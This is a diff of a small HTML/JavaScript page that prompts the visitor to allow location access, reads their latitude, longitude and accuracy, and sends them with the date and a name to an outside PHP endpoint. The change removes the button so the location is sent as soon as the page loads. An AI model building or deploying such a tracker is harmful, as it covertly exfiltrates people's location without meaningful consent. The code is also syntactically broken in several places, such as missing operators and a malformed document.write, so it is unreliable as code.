@@ -1,5 +1,3 @@
-<input type="text" id="textname">
-<input type="button" onClick="load()">
 <script>
 
 window.alert("許可押してね");
@@ -20,17 +18,11 @@ navigator.geolocation.getCurrentPosition( (position) => {
 
 var textname = document.getElementById('textname').value;
 
-function load() {
 location.href = "http://yumaabckhh.php.xdomain.jp/h.php?get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu "&name=" + textname;
-}
 </script>
 
 
 function display(lat, lng, accu) {
 
-document.write("");
-
-var dt = document.getElementById(dt);
-var dt = "http://yumaabckhh.php.xdomain.jp/h.php?get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + "&name=" + ;
-document.write(+ date + ">送信</a>");
+document.write(+ date + ">送信</a>"
 }
